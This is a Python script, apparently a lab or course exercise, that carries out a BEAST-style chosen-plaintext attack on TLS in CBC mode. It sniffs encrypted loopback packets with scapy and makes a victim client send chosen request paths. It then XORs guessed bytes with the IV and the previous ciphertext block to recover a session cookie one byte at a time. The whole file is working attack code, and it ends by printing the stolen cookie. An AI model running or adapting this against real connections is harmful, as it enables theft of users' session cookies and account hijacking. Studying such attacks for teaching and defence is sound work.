from socket import *
from scapy.all import sniff, Raw, TCP
import threading

BLOCK_SIZE = 16
STARTING_COOKIE_BLOCK = 5
COOKIE_BLOCK_NUM = STARTING_COOKIE_BLOCK
host = "127.0.0.3"
file_path = "aaaaaaaaaaabffffffffffffff"
#
stop_sniffing = False
captured_packet = None
'''
POST /aaaaaaaaaa
ab HTTP/1.1\r\nCon
tent-Type: text/
plain\r\nUser-Agen
t: Mozilla/4.0 (
'''

'''
POST /aaaaaaaaaa
abffffffffffffff
f HTTP/1.1\r\nCont
ent-Type: text/p
lain\r\nUser-Agent
: Mozilla/4.0 (?
????????????????
????????????????
'''

# Function to sniff packets
def sniff_packets():
    global stop_sniffing, captured_packet

    def packet_callback(packet):
        global captured_packet, stop_sniffing
        #print("Hey from sniffing thread")
        if TCP in packet and (packet[TCP].dport == 443):
            if Raw in packet:
                raw_data = packet[Raw].load
                #print(f"Raw_data = {raw_data}")
                # Check if the first byte of the Raw layer is 0x17 (TLS Application Data)
                if raw_data and raw_data[0] == 0x17:
                    print(f"Sniffed = {raw_data}")
                    captured_packet = raw_data

    def stop_filter(packet):
        return stop_sniffing

    # Start sniffing packets in the background
    sniff(iface='\\Device\\NPF_Loopback', filter='tcp', prn=packet_callback, stop_filter=stop_filter)
###

def init_server_socket(port):
    server = socket(AF_INET, SOCK_STREAM) # (IPV4, TCP) socket object 
    server.bind((host, port))
    server.listen(1)
    return server

def block_xor(b1, b2, b3):
    s = b''
    for c1, c2, c3 in zip(b1, b2, b3):
      s += bytes([c1 ^ c2 ^ c3])
    return s

def request_func(step):
    """
      Construct the current file_path
    """
    ans = file_path if step%BLOCK_SIZE == 0 else file_path[:-(step%BLOCK_SIZE)]
    return ans

def main(sock):
    global stop_sniffing, captured_packet
    global file_path , COOKIE_BLOCK_NUM, STARTING_COOKIE_BLOCK, BLOCK_SIZE
    curr_file_path = file_path
    iv = None
    i_know = b': Mozilla/4.0 ('
    attacker_cookie = b''

    while attacker_cookie[-2:] != b'\r\n':
        print("Attacker_cookie = ",end="")
        print(attacker_cookie)
        for i in range(256):
            #make the victim send the encrypted cookie
            sock.sendall(curr_file_path.encode() + b'\n') #followed by a newline character to match victim's `readLine()`
            while captured_packet is None or int.from_bytes(captured_packet[3:5], 'big')<49:
                pass
            print(f"Captured packet: {captured_packet}")
            cipher = captured_packet[5:]
            iv = cipher[-BLOCK_SIZE:]
            cookie_cipher = cipher[COOKIE_BLOCK_NUM*BLOCK_SIZE:(COOKIE_BLOCK_NUM+1)*BLOCK_SIZE]
            prev_cipher = cipher[(COOKIE_BLOCK_NUM-1)*BLOCK_SIZE:COOKIE_BLOCK_NUM*BLOCK_SIZE]

            guess = i_know+bytes([i])
            guess = block_xor(guess,iv,prev_cipher)
            sock.sendall(guess)
            while int.from_bytes(captured_packet[3:5], 'big')>=49:
                pass
            cipher = captured_packet[5:]
            if cipher[:BLOCK_SIZE] == cookie_cipher:
                attacker_cookie += bytes([i])
                break

        curr_file_path = request_func(len(attacker_cookie))
        i_know = i_know[1:]+bytes([i])

        COOKIE_BLOCK_NUM = STARTING_COOKIE_BLOCK+len(attacker_cookie)//BLOCK_SIZE
    
    stop_sniffing = True
    print("I AM THE ATTACKER.\nTHE VICTIM'S COOKIE IS", attacker_cookie)


if __name__ == '__main__':
    sniff_thread = threading.Thread(target=sniff_packets)
    sniff_thread.start()

    
    server = init_server_socket(port=1337)
    connection, victim_address = server.accept()
    main(connection)

    connection.close()
    server.close()

    sniff_thread.join()